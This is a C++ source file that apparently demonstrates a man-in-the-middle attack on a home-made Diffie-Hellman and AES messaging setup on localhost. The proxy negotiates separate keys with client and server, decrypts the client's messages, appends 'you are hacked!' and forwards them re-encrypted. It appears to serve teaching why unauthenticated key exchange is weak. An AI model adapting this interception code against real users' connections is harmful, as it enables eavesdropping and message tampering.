#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include "AES.h"
#include "exchange.h"
#include "func.h"

#define BUFFER_SIZE 256
#define CLIENT_PORT 8081
#define SERVER_PORT 8080

void handle_connection(int client_socket, int server_socket) {
    char buffer[BUFFER_SIZE];
    int bytes_read;

    // Key exchange with client
    Exchange* echg_client = new Exchange(0);
    echg_client->generate_private(); // a
    echg_client->culculate_public(); // A
    std::string pAg = p_A_g(echg_client->p, echg_client->A, echg_client->g); // pAg
    char pAgbuf[24];
    for (int i = 0; i < pAg.size(); i++)
        pAgbuf[i] = pAg[i];
    write(client_socket, pAgbuf, sizeof(pAgbuf));

    char B[10];
    if ((bytes_read = read(client_socket, B, sizeof(B))) < 0) {
        perror("read B");
        close(client_socket);
    }
    std::string sB = "";
    int i = 0;
    for (; B[i] != '\0'; i++)
        sB += B[i];
    echg_client->B = parseCH(sB);
    echg_client->culculate_shared_key();
    std::cout << "shared_K (client): " << echg_client->K << std::endl;

    AES* aes_client = new AES(echg_client->K);

    // Key exchange with server
    Exchange* echg_server = new Exchange(1); // p, g
    char pAg_server[24];
    if ((bytes_read = recv(server_socket, pAg_server, sizeof(pAg_server), 0)) == -1) {
        perror("exchange pAg");
        close(server_socket);
        exit(1);
    }
    std::string sp = "", sA = "", sg = "";
    i = 0;
    for (; pAg_server[i] != '\0'; i++)
        sp += pAg_server[i];
    i++;
    for (; pAg_server[i] != '\0'; i++)
        sA += pAg_server[i];
    i++;
    for (; pAg_server[i] != '\0'; i++)
        sg += pAg_server[i];
    echg_server->p = parseCH(sp);
    echg_server->A = parseCH(sA);
    echg_server->g = parseCH(sg);
    echg_server->generate_private(); // b
    echg_server->culculate_public(); // B
    echg_server->culculate_shared_key(); // K
    std::cout << "shared_K (server): " << echg_server->K << std::endl;

    std::string B_server = itoc(echg_server->B);
    char Bbuf[10];
    for (int i = 0; i < B_server.size(); i++)
        Bbuf[i] = B_server[i];
    if (send(server_socket, Bbuf, sizeof(Bbuf), 0) == -1) {
        perror("send B");
        close(server_socket);
        exit(1);
    }

    AES* aes_server = new AES(echg_server->K);

    // Intercept and modify messages
    while ((bytes_read = recv(client_socket, buffer, BUFFER_SIZE, 0)) > 0) {
        memcpy(aes_client->C, buffer, BUFFER_SIZE);
        aes_client->decryption();
        std::cout << "Original message from client: " << aes_client->De_P << std::endl;

        std::string cl_dep = "";
        for (int i = 0; aes_client->De_P[i] != '\0'; i++)
            cl_dep += aes_client->De_P[i];
        // Modify message
        std::string modified_message = cl_dep+"you are hacked!";
        memcpy(aes_server->P, modified_message.c_str(), BUFFER_SIZE);
        aes_server->encryption();
        memcpy(buffer, aes_server->C, BUFFER_SIZE);

        std::cout << "Modified message to server: " << buffer << std::endl;

        // Send modified message to server
        if (send(server_socket, buffer, BUFFER_SIZE, 0) == -1) {
            perror("send to server");
            close(server_socket);
            exit(1);
        }

        // Receive response from server
        if ((bytes_read = recv(server_socket, buffer, BUFFER_SIZE, 0)) <= 0) {
            break;
        }

        // Send response back to client
        if (send(client_socket, buffer, bytes_read, 0) == -1) {
            perror("send to client");
            close(client_socket);
            exit(1);
        }
    }

    close(client_socket);
    close(server_socket);
}

int main() {
    int listen_sock, client_sock, server_sock;
    struct sockaddr_in client_addr, server_addr, proxy_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    // Create listening socket for client
    listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_sock < 0) {
        perror("socket");
        return 1;
    }

    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_addr.s_addr = INADDR_ANY;
    proxy_addr.sin_port = htons(CLIENT_PORT);

    if (bind(listen_sock, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr)) < 0) {
        perror("bind");
        return 1;
    }

    if (listen(listen_sock, 1) < 0) {
        perror("listen");
        return 1;
    }

    // Connect to the real server
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock < 0) {
        perror("socket");
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        return 1;
    }

    if (connect(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        return 1;
    }

    std::cout << "Waiting for client connection on port " << CLIENT_PORT << "..." << std::endl;

    // Accept client connection
    client_sock = accept(listen_sock, (struct sockaddr*)&client_addr, &client_addr_len);
    if (client_sock < 0) {
        perror("accept");
        return 1;
    }

    std::cout << "Client connected." << std::endl;

    // Handle the connection
    handle_connection(client_sock, server_sock);

    // Close sockets
    close(client_sock);
    close(server_sock);
    close(listen_sock);

    return 0;
}
